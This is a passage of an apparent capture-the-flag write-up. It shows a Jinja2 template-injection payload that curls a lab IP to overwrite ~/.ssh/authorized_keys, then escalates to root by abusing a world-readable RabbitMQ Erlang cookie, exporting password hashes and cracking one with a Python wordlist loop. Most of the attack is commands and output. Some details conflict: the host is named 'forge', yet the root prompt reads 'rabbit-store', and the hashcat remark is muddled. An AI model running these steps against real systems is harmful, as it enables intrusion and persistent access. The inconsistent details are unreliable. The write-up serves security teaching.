{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl http://10.21.23.235:8000/id_ed25519.pub -o ~/.ssh/authorized_keys').read() }}"}
```

```
╔══════════╣ Analyzing Erlang Files (limit 70)
-r-----r-- 1 rabbitmq rabbitmq 16 May 18 22:26 /var/lib/rabbitmq/.erlang.cookie
gdkGFHW4NuwcsFc9
```

That cookie is the whole game for RabbitMQ. Erlang nodes in a cluster authenticate to each other purely by sharing the same cookie value, whoever holds it can talk to the running `rabbit@<node>` process with the same authority as the service itself, no application-level password required. Since the cookie file was readable by anyone (`-r-----r--`, that trailing `r` is the one that matters), `azrael`'s foothold was enough to borrow RabbitMQ's own identity.

## Root, abusing the RabbitMQ Erlang cookie

First step was finding out what the node actually calls itself, `rabbitmqctl` needs the exact node name to target, and it's normally derived from the hostname:

```bash
hostname
# forge
echo "127.0.0.1 forge" | sudo tee -a /etc/hosts
```

With that in place I could reuse the leaked cookie to talk to the RabbitMQ node directly instead of needing its actual service account:

```bash
sudo rabbitmqctl --erlang-cookie 'gdkGFHW4NuwcsFc9' --node rabbit@forge status
sudo rabbitmqctl --erlang-cookie 'gdkGFHW4NuwcsFc9' --node rabbit@forge list_users
```

```console
Listing users ...
user	tags
azrael	[]
root	[administrator]
```

A `root` user with the `administrator` tag sitting inside RabbitMQ's own user table was exactly what I was hoping to see. RabbitMQ doesn't hand back plaintext passwords through `list_users`, but it will happily export its entire user table, hashes included, if you ask it to dump its definitions:

```bash
sudo rabbitmqctl --erlang-cookie 'gdkGFHW4NuwcsFc9' --node rabbit@forge export_definitions /tmp/definitions.json
cat /tmp/definitions.json | jq '.users[] | select(.name=="root")'
```

```console
{
  "name": "root",
  "password_hash": "<base64-encoded salted SHA-256 hash for this instance>",
  "hashing_algorithm": "rabbit_password_hashing_sha256",
  "tags": ["administrator"]
}
```

RabbitMQ's default hashing scheme is documented and deterministic: `password_hash` is `base64(<4-byte random salt> + SHA256(<salt> + <password>))`. Base64-decoding that value and splitting off the first 4 bytes recovers the salt, leaving a plain SHA-256 digest that a standard cracker can attack directly, since the salt is short and known, hashcat mode 1450 (`HMAC-SHA256` variants aside, salted-SHA256) or a short custom Python loop trying candidate passwords with that recovered salt gets there quickly against a weak enough password:

```bash
python3 - <<'EOF'
import base64, hashlib
blob = base64.b64decode("<password_hash from definitions.json>")
salt, digest = blob[:4], blob[4:]
with open("/usr/share/wordlists/rockyou.txt", "rb") as wl:
    for line in wl:
        pw = line.strip()
        if hashlib.sha256(salt + pw).digest() == digest:
            print("password:", pw.decode())
            break
EOF
```

That recovers `root`'s plaintext system password (the RabbitMQ account and the Linux `root` account share it on this box), and from there it's a one-line hop to a real root shell:

```bash
su - root
# Password: <cracked value>
```

```console
root@rabbit-store:~# id
uid=0(root) gid=0(root)
root@rabbit-store:~# cat root.txt
```

`cat root.txt` returns the flag for this instance. Looking back at the whole chain, every stage here was really the same lesson repeated at a different layer, mass assignment let me hand the app a field it should never have trusted, SSRF let me hand the internal API a destination it should never have trusted, SSTI let me hand Jinja2 template source it should never have trusted, and finally a world-readable Erlang cookie let me hand RabbitMQ a login it should never have trusted either. Once you're looking for "what is this component blindly trusting", the whole box reads as one pattern instead of four unrelated bugs.

## References

- Final privilege escalation steps cross-referenced against public writeups for this room.
